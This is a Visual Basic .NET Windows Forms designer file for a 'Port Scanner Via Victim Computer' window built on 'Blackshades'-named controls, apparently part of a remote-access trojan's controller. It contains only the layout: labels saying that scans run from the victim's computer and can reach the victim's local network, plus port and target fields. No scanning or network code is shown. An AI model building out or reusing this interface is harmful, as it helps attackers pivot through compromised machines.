<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class scanner
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(scanner))
        Me.BlackShadesNetForm1 = New Blackshades.BlackShadesNetForm()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.BlackShadesNetButton1 = New Blackshades.BlackShadesNetButton()
        Me.TextBox3 = New Blackshades.BlackShadesNetTextBox()
        Me.TextBox2 = New Blackshades.BlackShadesNetTextBox()
        Me.TextBox1 = New Blackshades.BlackShadesNetTextBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.ListView1 = New System.Windows.Forms.ListView()
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ImageList1 = New System.Windows.Forms.ImageList(Me.components)
        Me.BlackShadesNetForm1.SuspendLayout()
        Me.SuspendLayout()
        '
        'BlackShadesNetForm1
        '
        Me.BlackShadesNetForm1.CloseButtonExitsApp = False
        Me.BlackShadesNetForm1.Controls.Add(Me.Label5)
        Me.BlackShadesNetForm1.Controls.Add(Me.BlackShadesNetButton1)
        Me.BlackShadesNetForm1.Controls.Add(Me.TextBox3)
        Me.BlackShadesNetForm1.Controls.Add(Me.TextBox2)
        Me.BlackShadesNetForm1.Controls.Add(Me.TextBox1)
        Me.BlackShadesNetForm1.Controls.Add(Me.Label4)
        Me.BlackShadesNetForm1.Controls.Add(Me.Label3)
        Me.BlackShadesNetForm1.Controls.Add(Me.Label2)
        Me.BlackShadesNetForm1.Controls.Add(Me.Label1)
        Me.BlackShadesNetForm1.Controls.Add(Me.ListView1)
        Me.BlackShadesNetForm1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.BlackShadesNetForm1.Font = New System.Drawing.Font("Trebuchet MS", 8.25!, System.Drawing.FontStyle.Bold)
        Me.BlackShadesNetForm1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(152, Byte), Integer), CType(CType(156, Byte), Integer))
        Me.BlackShadesNetForm1.Location = New System.Drawing.Point(0, 0)
        Me.BlackShadesNetForm1.MinimizeButton = True
        Me.BlackShadesNetForm1.Name = "BlackShadesNetForm1"
        Me.BlackShadesNetForm1.Size = New System.Drawing.Size(320, 568)
        Me.BlackShadesNetForm1.TabIndex = 0
        Me.BlackShadesNetForm1.Text = "Port Scanner Via Victim Computer  : "
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.BackColor = System.Drawing.Color.Transparent
        Me.Label5.Font = New System.Drawing.Font("Trebuchet MS", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label5.ForeColor = System.Drawing.Color.Red
        Me.Label5.Location = New System.Drawing.Point(3, 187)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(312, 18)
        Me.Label5.TabIndex = 11
        Me.Label5.Text = "Note : Any requests will be from victim Computer"
        '
        'BlackShadesNetButton1
        '
        Me.BlackShadesNetButton1.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(38, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.BlackShadesNetButton1.Font = New System.Drawing.Font("Trebuchet MS", 8.25!, System.Drawing.FontStyle.Bold)
        Me.BlackShadesNetButton1.ForeColor = System.Drawing.Color.Lime
        Me.BlackShadesNetButton1.Location = New System.Drawing.Point(217, 33)
        Me.BlackShadesNetButton1.Name = "BlackShadesNetButton1"
        Me.BlackShadesNetButton1.Size = New System.Drawing.Size(91, 51)
        Me.BlackShadesNetButton1.TabIndex = 10
        Me.BlackShadesNetButton1.Text = "Start Scanning"
        Me.BlackShadesNetButton1.TextAlignment = System.Drawing.StringAlignment.Center
        '
        'TextBox3
        '
        Me.TextBox3.BackColor = System.Drawing.Color.FromArgb(CType(CType(36, Byte), Integer), CType(CType(40, Byte), Integer), CType(CType(42, Byte), Integer))
        Me.TextBox3.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(152, Byte), Integer), CType(CType(156, Byte), Integer))
        Me.TextBox3.Location = New System.Drawing.Point(136, 94)
        Me.TextBox3.MaxLength = 32767
        Me.TextBox3.Name = "TextBox3"
        Me.TextBox3.Size = New System.Drawing.Size(172, 24)
        Me.TextBox3.TabIndex = 9
        Me.TextBox3.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.TextBox3.UseSystemPasswordChar = False
        '
        'TextBox2
        '
        Me.TextBox2.BackColor = System.Drawing.Color.FromArgb(CType(CType(36, Byte), Integer), CType(CType(40, Byte), Integer), CType(CType(42, Byte), Integer))
        Me.TextBox2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(152, Byte), Integer), CType(CType(156, Byte), Integer))
        Me.TextBox2.Location = New System.Drawing.Point(76, 60)
        Me.TextBox2.MaxLength = 32767
        Me.TextBox2.Name = "TextBox2"
        Me.TextBox2.Size = New System.Drawing.Size(135, 24)
        Me.TextBox2.TabIndex = 8
        Me.TextBox2.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.TextBox2.UseSystemPasswordChar = False
        '
        'TextBox1
        '
        Me.TextBox1.BackColor = System.Drawing.Color.FromArgb(CType(CType(36, Byte), Integer), CType(CType(40, Byte), Integer), CType(CType(42, Byte), Integer))
        Me.TextBox1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(152, Byte), Integer), CType(CType(156, Byte), Integer))
        Me.TextBox1.Location = New System.Drawing.Point(76, 31)
        Me.TextBox1.MaxLength = 32767
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(135, 24)
        Me.TextBox1.TabIndex = 7
        Me.TextBox1.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.TextBox1.UseSystemPasswordChar = False
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.BackColor = System.Drawing.Color.Transparent
        Me.Label4.ForeColor = System.Drawing.Color.Lime
        Me.Label4.Location = New System.Drawing.Point(2, 136)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(280, 48)
        Me.Label4.TabIndex = 6
        Me.Label4.Text = "Note : Any Scan Will be from Victim Computer  " & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "If you want to Scan Local Compute" & _
    "rs in Victim Lan " & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Enter The Computer Local IP Address" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10)
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.BackColor = System.Drawing.Color.Transparent
        Me.Label3.ForeColor = System.Drawing.Color.Lime
        Me.Label3.Location = New System.Drawing.Point(3, 99)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(128, 16)
        Me.Label3.TabIndex = 5
        Me.Label3.Text = "WebSite / IP Address : "
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.BackColor = System.Drawing.Color.Transparent
        Me.Label2.ForeColor = System.Drawing.Color.Lime
        Me.Label2.Location = New System.Drawing.Point(2, 65)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(62, 16)
        Me.Label2.TabIndex = 4
        Me.Label2.Text = "End Port : "
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.BackColor = System.Drawing.Color.Transparent
        Me.Label1.ForeColor = System.Drawing.Color.Lime
        Me.Label1.Location = New System.Drawing.Point(3, 33)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(67, 16)
        Me.Label1.TabIndex = 3
        Me.Label1.Text = "Start Port : "
        '
        'ListView1
        '
        Me.ListView1.BackColor = System.Drawing.Color.FromArgb(CType(CType(47, Byte), Integer), CType(CType(47, Byte), Integer), CType(CType(47, Byte), Integer))
        Me.ListView1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1})
        Me.ListView1.ForeColor = System.Drawing.Color.Lime
        Me.ListView1.LargeImageList = Me.ImageList1
        Me.ListView1.Location = New System.Drawing.Point(5, 215)
        Me.ListView1.Name = "ListView1"
        Me.ListView1.Size = New System.Drawing.Size(312, 350)
        Me.ListView1.SmallImageList = Me.ImageList1
        Me.ListView1.TabIndex = 2
        Me.ListView1.UseCompatibleStateImageBehavior = False
        Me.ListView1.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader1
        '
        Me.ColumnHeader1.Text = "Port Scanner Results"
        Me.ColumnHeader1.Width = 307
        '
        'ImageList1
        '
        Me.ImageList1.ImageStream = CType(resources.GetObject("ImageList1.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList1.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList1.Images.SetKeyName(0, "151.png")
        Me.ImageList1.Images.SetKeyName(1, "152.png")
        '
        'scanner
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(320, 568)
        Me.Controls.Add(Me.BlackShadesNetForm1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Name = "scanner"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Port Scanner Via Victim Computer  : "
        Me.TransparencyKey = System.Drawing.Color.Fuchsia
        Me.BlackShadesNetForm1.ResumeLayout(False)
        Me.BlackShadesNetForm1.PerformLayout()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents BlackShadesNetForm1 As Blackshades.BlackShadesNetForm
    Friend WithEvents ListView1 As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents TextBox1 As Blackshades.BlackShadesNetTextBox
    Friend WithEvents TextBox3 As Blackshades.BlackShadesNetTextBox
    Friend WithEvents TextBox2 As Blackshades.BlackShadesNetTextBox
    Friend WithEvents BlackShadesNetButton1 As Blackshades.BlackShadesNetButton
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents ImageList1 As System.Windows.Forms.ImageList
End Class
